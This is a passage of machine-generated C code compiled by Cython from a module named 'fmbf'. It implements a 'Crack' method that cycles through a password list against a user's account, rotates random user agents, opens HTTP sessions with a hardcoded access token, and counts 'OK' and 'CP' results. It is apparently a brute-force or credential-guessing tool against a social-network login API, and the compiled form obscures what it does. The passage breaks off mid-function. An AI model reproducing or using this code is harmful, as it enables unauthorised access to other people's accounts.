    __Pyx_XGIVEREF(__pyx_t_1);
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __pyx_cur_scope->__pyx_t_1 = __pyx_t_4;
    __pyx_cur_scope->__pyx_t_2 = __pyx_t_5;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    __pyx_cur_scope->__pyx_t_0 = 0;
    __Pyx_XGOTREF(__pyx_t_1);
    __pyx_t_4 = __pyx_cur_scope->__pyx_t_1;
    __pyx_t_5 = __pyx_cur_scope->__pyx_t_2;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 286, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_pf_4fmbf_5Crack_6metode_api(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pwx) {
  struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *__pyx_cur_scope;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_gb_4fmbf_5Crack_10metode_api_2generator = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *(*__pyx_t_12)(PyObject *);
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  int __pyx_t_20;
  int __pyx_t_21;
  int __pyx_t_22;
  int __pyx_t_23;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("metode_api", 0);
  __pyx_cur_scope = (struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)__pyx_tp_new_4fmbf___pyx_scope_struct__metode_api(__pyx_ptype_4fmbf___pyx_scope_struct__metode_api, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 272, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_INCREF(__pyx_kp_u__62);
  __pyx_t_4 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__62);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u__62);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_N); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_crack);
  __pyx_t_4 += 12;
  __Pyx_GIVEREF(__pyx_kp_u_crack);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_crack);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u__48);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__48);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u__48);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_tampung); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_OK_2);
  __pyx_t_4 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_OK_2);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_OK_2);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_CP_2);
  __pyx_t_4 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_CP_2);
  PyTuple_SET_ITEM(__pyx_t_3, 8, __pyx_kp_u_CP_2);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 9, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u__2);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyTuple_SET_ITEM(__pyx_t_3, 10, __pyx_kp_u__2);
  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_3, 11, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 273, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 274, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 274, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_flush); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 274, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 274, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_11);
     {

      
      if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
        __pyx_t_2 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_2); __pyx_t_4 = 0;
        __pyx_t_12 = NULL;
      } else {
        __pyx_t_4 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 276, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_12 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 276, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_12)) {
          if (likely(PyList_CheckExact(__pyx_t_2))) {
            if (__pyx_t_4 >= PyList_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_4); __Pyx_INCREF(__pyx_t_1); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 276, __pyx_L3_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 276, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
          } else {
            if (__pyx_t_4 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_4); __Pyx_INCREF(__pyx_t_1); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 276, __pyx_L3_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 276, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
          }
        } else {
          __pyx_t_1 = __pyx_t_12(__pyx_t_2);
          if (unlikely(!__pyx_t_1)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 276, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_1);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_1);
        __pyx_t_1 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 277, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 277, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_1);
        __pyx_t_1 = 0;

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_14, &__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_15);
           {
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__63, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_read); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
              __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
              if (likely(__pyx_t_16)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                __Pyx_INCREF(__pyx_t_16);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_17, function);
              }
            }
            __pyx_t_7 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
              __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_17);
              if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_17, function);
              }
            }
            __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_17);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_17, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6);
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 278, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_3);
            __pyx_t_3 = 0;
          }
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          goto __pyx_L18_try_end;
          __pyx_L11_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

          
           {
            __Pyx_AddTraceback("fmbf.Crack.metode_api", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_6) < 0) __PYX_ERR(0, 279, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_random); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 279, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_choice); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 279, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ugent); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 279, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_18 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_16);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_16, function);
              }
            }
            __pyx_t_17 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_18, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_7);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 279, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            goto __pyx_L12_exception_handled;
          }
          __pyx_L13_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
          goto __pyx_L3_error;
          __pyx_L12_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
          __pyx_L18_try_end:;
        }

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_Session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 280, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_6 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 280, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_6);
        __pyx_t_6 = 0;

        
        __pyx_t_6 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_access_token, __pyx_kp_s_200424423651082_2a9918c6bcd75b94) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
